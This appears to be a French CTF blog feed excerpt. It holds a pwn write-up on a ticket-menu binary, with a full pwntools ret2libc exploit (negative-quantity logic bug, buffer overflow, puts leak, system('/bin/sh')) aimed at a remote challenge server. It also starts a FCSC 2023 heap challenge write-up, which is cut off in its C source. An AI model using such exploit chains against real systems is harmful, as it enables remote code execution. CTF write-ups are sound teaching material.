<p>On a le binaire et la <code>libc</code> qui va avec, ça nous indique déjà qu&rsquo;on va probablement devoir interagir avec.</p>
<p>On peut commencer par regarder rapidement à quoi on s&rsquo;attaque grâce aux commandes <em>file</em> et <em>checksec</em>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>file original <span style="color:#f92672">&amp;&amp;</span> checksec original
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>original: ELF <span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>bit LSB executable, x86<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span>, version <span style="color:#ae81ff">1</span> (SYSV), dynamically linked, interpreter <span style="color:#f92672">/</span>lib64<span style="color:#f92672">/</span>ld<span style="color:#f92672">-</span>linux<span style="color:#f92672">-</span>x86<span style="color:#f92672">-</span><span style="color:#ae81ff">64.</span>so<span style="color:#ae81ff">.2</span>, BuildID[sha1]<span style="color:#f92672">=</span>c62621cd085e6fcda874f1bd9d8983cd18d0b051, <span style="color:#66d9ef">for</span> GNU<span style="color:#f92672">/</span>Linux <span style="color:#ae81ff">4.4.0</span>, <span style="color:#f92672">not</span> stripped
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Arch:     amd64<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>little
</span></span><span style="display:flex;"><span>    RELRO:    Partial RELRO
</span></span><span style="display:flex;"><span>    Stack:    No canary found
</span></span><span style="display:flex;"><span>    NX:       NX enabled
</span></span><span style="display:flex;"><span>    PIE:      No PIE (<span style="color:#ae81ff">0x400000</span>)
</span></span></code></pre></div><p>Il s&rsquo;agit d&rsquo;un <em>ELF</em> en <em>64 bits</em> protégé par <code>NX</code>.</p>
<p>On va le run pour avoir une idée de ce qu&rsquo;il fait:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/236800594-665593f0-e38e-4ab0-bb6b-fd1d948e559b.png" alt="2023-05-08-112543_973x101_scrot"></p>
<p>Il nous demande notre username, puis on accède à un menu avec <strong>4 options</strong></p>
<p><img src="https://user-images.githubusercontent.com/77807503/236800637-b28d55d1-7239-43b6-8776-4d97c4bfef1e.png" alt="2023-05-08-112550_1094x371_scrot"></p>
<p>On va lancer <code>Ghidra</code> pour comprendre un peut mieux comment le programme fonctionne.</p>
<h4 id="main">Main</h4>
<p><img src="https://user-images.githubusercontent.com/77807503/236800688-3e10c0a5-e92d-45c2-9bb0-c0414fc562b6.png" alt="2023-05-08-113209_749x501_scrot"></p>
<p>Après avoir renommé le variable de <em>buffer</em>, on voit qu&rsquo;il n&rsquo;y a a priori pas de vulnérabilité dans la fonction <code>main()</code>, le <em>buffer</em> dans lequel est stocké l&rsquo;username est de la même taille que le <code>fgets()</code> donc ça me paraît bon.</p>
<p>On voit qu&rsquo;elle appelle une fonction <code>menu()</code>, on va s&rsquo;y intéresser</p>
<h4 id="menu">Menu</h4>
<p><img src="https://user-images.githubusercontent.com/77807503/236800701-5cb4532d-49b2-4d8e-bb84-d296055a4512.png" alt="2023-05-08-113854_514x764_scrot"></p>
<p>Après avoir renommé les variables <em>buffer</em> et <em>money</em> (qui stockent l&rsquo;argent de l&rsquo;utilisateur), on regarde les différentes options:</p>
<ol>
<li>Affiche l&rsquo;argent de l&rsquo;utilisateur</li>
<li>Appelle la fonction <code>buy_ticket()</code></li>
<li>Appelle la fonction <code>buy_vip_ticket()</code> puis met à jour des variables ainsi que la <em>money</em></li>
<li>Si l&rsquo;utilisateur a assez d&rsquo;argent, appelle la fonction <code>access_lounge()</code>, sinon affiche un message</li>
</ol>
<p>On va regarder un peu les fonctions unes par unes et voir si on peut trouver des vuln</p>
<h4 id="buy_ticket">buy_ticket</h4>
<p><img src="https://user-images.githubusercontent.com/77807503/236800786-67e9c5cc-7cd2-414f-8c90-91ef85b7cc0b.png" alt="2023-05-08-114712_687x573_scrot"></p>
<p>Après s&rsquo;être faits rickroll de plein fouet, on peut s&rsquo;attarder sur la manière dont le choix de quantité. En effet, <strong>la fonction ne vérifie pas si notre input est négatif</strong>, en entrant un nombre négatif dans l&rsquo;input de quantité, notre <em>money</em> va augmenter au lieu de diminuer (comme elle le devrait si on achetait une quantité positive).</p>
<p>Ok, on sait comment abuser d&rsquo;un <em>logic bug</em> pour avoir de l&rsquo;argent infini, maintenant il faut savoir à quoi il va nous servir</p>
<h4 id="buy_vip_ticket">buy_vip_ticket</h4>
<p><img src="https://user-images.githubusercontent.com/77807503/236800808-03d6ca0b-1619-4917-a82b-766fdee8589c.png" alt="2023-05-08-115648_570x636_scrot"></p>
<p>Si l&rsquo;utilisateur a sufisamment d&rsquo;argent, un <em>input</em> lui permet de confirmer l&rsquo;action et il devient <strong>VIP</strong></p>
<h4 id="access_lounge">access_lounge</h4>
<p><img src="https://user-images.githubusercontent.com/77807503/236800827-964fb1c7-5102-45a7-9b31-77b0aa5d4214.png" alt="2023-05-08-120254_520x411_scrot"></p>
<p>Cette dernière fonction n&rsquo;est accessible que si nous sommes <strong>VIP</strong>, mais puisque nous avons un bug pour le devenir, ce n&rsquo;est pas un problème.</p>
<p>Et nous avons enfin notre vuln ! Le <code>fgets</code> lit <code>0x100</code> bytes et les stocke quand un <em>buffer</em> de <code>16</code> bytes, on a donc ici une <em>buffer overflow</em>.</p>
<h2 id="tldr-vulnérabilités">TLDR: Vulnérabilités</h2>
<ol>
<li>L&rsquo;option 2 nous permet de dupliquer notre argent en entrant un nombre négatif</li>
<li>Le bug précédent nous permet de devenir <strong>VIP</strong> et de créer un lounge</li>
<li>Dans la création du lounge il y a une <em>buffer overflow</em> qui va nous permettre d&rsquo;obtenir notre shell</li>
</ol>
<h2 id="plan-dattaque">Plan d&rsquo;attaque</h2>
<p>La première étape de notre exploit va donc être d&rsquo;avoir accès au salon <strong>VIP</strong> pour avoir la <code>BOF</code>, puis grâce à cette dernière on va <em>leak</em> une adresse de la <code>libc</code> et retourner au <code>main</code>, puis réaccéder au <strong>VIP</strong> et appeller <code>system</code> via la <em>BOF</em>.</p>
<p><code>Logic bug -&gt; ret2main (with leaks) -&gt; ret2system</code></p>
<blockquote>
<p>Je ne montrerai pas dans ce post comment récupérer les différentes adresses statiques, je vous invite à aller voir mes posts de pwn précédents si ça vous initéresse</p></blockquote>
<h2 id="exploit">Exploit</h2>
<p>Voici mon exploit final:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>update(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;x86_64&#39;</span>)
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;vip_at_libc_patched&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;libc.so.6&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>ld <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./ld-2.35.so&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>REMOTE:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;51.254.39.184&#34;</span>, <span style="color:#ae81ff">1335</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>        gdb<span style="color:#f92672">.</span>attach(r)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> start()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">see_current_balance</span>(conn):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;seeing current balance&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> conn<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;$&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>decode()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">buy_ticket</span>(conn, choice, amount):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;buying ticket&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>, choice)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>, amount)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">buy_vip_ticket</span>(conn):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;buying VIP ticket&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;3&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create_vip_lounge</span>(conn, name):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;creating VIP lounge&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>, name)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;want.&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># =============================================================================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># =-=-=- Un jour je serai le meilleur pwner -=-=-=</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rdi_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000401186</span>
</span></span><span style="display:flex;"><span>puts_plt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000401030</span>
</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000040101a</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Y&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">24</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rdi_ret) <span style="color:#f92672">+</span> p64(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#34;puts&#34;</span>]) <span style="color:#f92672">+</span> p64(puts_plt)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;main&#34;</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;username: &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;conflict&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Dupliquer l&#39;argent</span>
</span></span><span style="display:flex;"><span>buy_ticket(io, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;-5000000&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Devenir VIP = avoir accès au lounge</span>
</span></span><span style="display:flex;"><span>buy_vip_ticket(io)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Créer un lounge avec le premier payload pour leak</span>
</span></span><span style="display:flex;"><span>create_vip_lounge(io, payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>puts_leak <span style="color:#f92672">=</span> u64(io<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;Leaked puts @ &#34;</span> <span style="color:#f92672">+</span> hex(puts_leak))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> puts_leak <span style="color:#f92672">-</span> (<span style="color:#ae81ff">0x7f5c61e80ed0</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x7f5c61e00000</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;Resolved libc @ &#34;</span> <span style="color:#f92672">+</span> hex(libc<span style="color:#f92672">.</span>address))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>bin_sh <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;system&#34;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;/bin/sh @ &#34;</span> <span style="color:#f92672">+</span> hex(bin_sh))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;system @ &#34;</span> <span style="color:#f92672">+</span> hex(system))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Y&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">24</span> <span style="color:#f92672">+</span> p64(ret)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rdi_ret) <span style="color:#f92672">+</span> p64(bin_sh)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(system)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Puisqu&#39;on est au main, il faut re-entrer notre username</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;conflict&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Refaire la manip pour être vip</span>
</span></span><span style="display:flex;"><span>buy_ticket(io, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;-5000000&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>buy_vip_ticket(io)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Payload final, on devrait avoir un shell</span>
</span></span><span style="display:flex;"><span>create_vip_lounge(io, payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># =============================================================================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div>]]></content>
        </item>
        
        <item>
            <title>🇫🇷 FCSC 2023 - pwn/robot</title>
            <link>/posts/2023/04/fcsc-2023-pwn/robot/</link>
            <pubDate>Sun, 30 Apr 2023 00:00:00 +0000</pubDate>
            
            <guid>/posts/2023/04/fcsc-2023-pwn/robot/</guid>
            <description>&lt;h2 id=&#34;note&#34;&gt;Note&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;robot&lt;/em&gt; était un challenge de pwn issu du &lt;strong&gt;FCSC 2023&lt;/strong&gt;. Globalement un très bon challenge, et surtout une très bonne initiation à l&amp;rsquo;exploitation &lt;em&gt;heap&lt;/em&gt; puisque je n&amp;rsquo;en avais jamais fait !&lt;/p&gt;
&lt;h2 id=&#34;description&#34;&gt;Description&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;La startup _FunWithRobots &amp;amp; Co._ souhaite proposer un service interactif, qui tourne sur un serveur distant et qui simule un robot avec beaucoup de réalisme. 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Mais la veille de l&amp;#39;inauguration, le chef de projet se souvient d&amp;#39;une vague mention concernant des exigences de sécurité...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Comme vous êtes la personne chargée de la sécurité, il a besoin de votre validation.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Selon lui, cela n&amp;#39;est qu&amp;#39;une simple formalité car le code a été relu par leurs meilleurs développeurs et le binaire s&amp;#39;exécute avec toutes les protections classiques (canaris, W^X, ASLR, etc.).
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Vérifiez s&amp;#39;il est possible de lire le fichier `flag.txt` qui se trouve sur le serveur distant.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;a href=&#34;https://france-cybersecurity-challenge.fr/files/069ca7f147eb771e02814586cfa94514/robot&#34;&gt;&lt;code&gt;robot&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://france-cybersecurity-challenge.fr/files/323d5aa30fc1f647e4d60019a74b3dde/robot.c&#34;&gt;&lt;code&gt;robot.c&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="note">Note</h2>
<p><em>robot</em> était un challenge de pwn issu du <strong>FCSC 2023</strong>. Globalement un très bon challenge, et surtout une très bonne initiation à l&rsquo;exploitation <em>heap</em> puisque je n&rsquo;en avais jamais fait !</p>
<h2 id="description">Description</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>La startup _FunWithRobots &amp; Co._ souhaite proposer un service interactif, qui tourne sur un serveur distant et qui simule un robot avec beaucoup de réalisme. 
</span></span><span style="display:flex;"><span>Mais la veille de l&#39;inauguration, le chef de projet se souvient d&#39;une vague mention concernant des exigences de sécurité...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Comme vous êtes la personne chargée de la sécurité, il a besoin de votre validation.
</span></span><span style="display:flex;"><span>Selon lui, cela n&#39;est qu&#39;une simple formalité car le code a été relu par leurs meilleurs développeurs et le binaire s&#39;exécute avec toutes les protections classiques (canaris, W^X, ASLR, etc.).
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Vérifiez s&#39;il est possible de lire le fichier `flag.txt` qui se trouve sur le serveur distant.
</span></span></code></pre></div><p><a href="https://france-cybersecurity-challenge.fr/files/069ca7f147eb771e02814586cfa94514/robot"><code>robot</code></a>, <a href="https://france-cybersecurity-challenge.fr/files/323d5aa30fc1f647e4d60019a74b3dde/robot.c"><code>robot.c</code></a></p>
<h2 id="analyse-du-fichier">Analyse du fichier</h2>
<p>On peut commencer par regarder rapidement à quoi on s&rsquo;attaque grâce aux commandes <em>file</em> et <em>checksec</em>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>file robot <span style="color:#f92672">&amp;&amp;</span> checksec robot
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>robot: ELF <span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>bit LSB pie executable, x86<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span>, version <span style="color:#ae81ff">1</span> (SYSV), dynamically linked, interpreter <span style="color:#f92672">/</span>lib64<span style="color:#f92672">/</span>ld<span style="color:#f92672">-</span>linux<span style="color:#f92672">-</span>x86<span style="color:#f92672">-</span><span style="color:#ae81ff">64.</span>so<span style="color:#ae81ff">.2</span>, BuildID[sha1]<span style="color:#f92672">=</span>b1bb8d94563bab30f6fe505e4a7220d51f68c5aa, <span style="color:#66d9ef">for</span> GNU<span style="color:#f92672">/</span>Linux <span style="color:#ae81ff">3.2.0</span>, <span style="color:#f92672">not</span> stripped
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Arch:     amd64<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>little
</span></span><span style="display:flex;"><span>    RELRO:    Full RELRO
</span></span><span style="display:flex;"><span>    Stack:    Canary found
</span></span><span style="display:flex;"><span>    NX:       NX enabled
</span></span><span style="display:flex;"><span>    PIE:      PIE enabled
</span></span></code></pre></div><p>On voit donc qu&rsquo;on va s&rsquo;attaquer à un <em>ELF</em> en <em>64 bits</em> protégé par toutes les protections (comme dit dans la desc).</p>
<p>On va le run pour avoir une idée de ce qu&rsquo;il fait:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/235506504-7fc953da-3707-4499-b570-08c3526eec6e.png" alt="2023-05-01-191537_656x191_scrot"></p>
<p>On a plusieurs options, mais on peut les rassembler en 3 catégories:</p>
<ul>
<li>Les options <strong>1</strong> et <strong>4</strong> vont a priori nous permettre d&rsquo;allouer des chunks (via <em>malloc</em>) pour créer le robot et le mode d&rsquo;emploi</li>
<li>Les options <strong>2</strong> et <strong>5</strong> vont afficher le contenu d&rsquo;un chunk qu&rsquo;on aura crée au préalable, ça nous sera probablement utile pour leak des adresses</li>
<li>Les options <strong>3</strong> et <strong>6</strong> vont respectivement nous permettre de supprimer un chunk (via <em>free</em>) et d&rsquo;appeller la fonction <code>admin</code></li>
</ul>
<p>Maintenant qu&rsquo;on sait ça, on va regarder un peu le code source pour tenter de trouver une vuln et de vérifier nos hypothèses:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;openssl/sha.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;ctype.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;signal.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define TIMEOUT       120 </span><span style="color:#75715e">// in seconds
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> encrypted[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;8f75456b574439e191ae14f3e95a80a881a7216c2ac69b9c342aa62f8a048e0e&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> Robot {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">16</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>makeNoise)();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>move)();
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> RobotUserGuide {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> guide[<span style="color:#ae81ff">32</span>];
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">timeout</span>(<span style="color:#66d9ef">int</span> sig)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">bleep</span>(<span style="color:#66d9ef">struct</span> Robot <span style="color:#f92672">*</span>d)
</span></span><span style="display:flex;"><span>{
